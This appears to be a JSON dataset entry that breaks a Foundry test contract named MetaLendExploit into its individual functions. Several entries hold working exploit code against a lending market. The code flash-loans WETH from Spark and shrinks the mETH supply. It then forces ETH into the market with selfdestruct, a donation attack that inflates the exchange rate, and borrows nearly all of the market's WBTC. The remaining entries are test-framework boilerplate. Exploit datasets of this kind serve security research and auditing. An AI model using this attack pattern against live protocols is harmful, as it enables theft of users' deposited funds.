[
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        Helper helper = new Helper{value: 100 ether}();\n        helper.donateAndBorrow();\n        WETH.deposit{value: address(this).balance}();\n        WBTC.approve(address(Router), type(uint256).max);\n        WBTCToWETH();\n        WETH.approve(address(Spark), amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        vm.label(address(Spark), \"Spark\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(Comptroller), \"Comptroller\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MetaLendExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0);\n        emit log_named_decimal_uint(\"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), 18);\n\n        Spark.flashLoanSimple(address(this), address(WETH), 100e18, bytes(\"\"), 0);\n\n        emit log_named_decimal_uint(\"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Donator",
    "source_type": "attacker_contract",
    "function_name": "sendETHTo",
    "original_code": "    function sendETHTo(\n        address to\n    ) external payable {\n        selfdestruct(payable(to));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Helper",
    "source_type": "attacker_contract",
    "function_name": "donateAndBorrow",
    "original_code": "    function donateAndBorrow() external {\n        mETH.mint{value: 1 ether}();\n        uint256 reedemAmount = mETH.totalSupply() - 2;\n        mETH.redeem(reedemAmount);\n        Donator donator = new Donator();\n        donator.sendETHTo{value: address(this).balance}(address(mETH));\n        address[] memory mTokens = new address[](1);\n        mTokens[0] = address(mETH);\n        Comptroller.enterMarkets(mTokens);\n        uint256 underlyingWBTCAmount = mWBTC.getCash();\n        mWBTC.borrow(underlyingWBTCAmount - 1);\n        WBTC.transfer(owner, WBTC.balanceOf(address(this)));\n        mETH.redeemUnderlying(mETH.getCash() - 1);\n        (bool success,) = owner.call{value: address(this).balance}(\"\");\n        require(success);\n    }\n\n",
    "description": ""
  }
]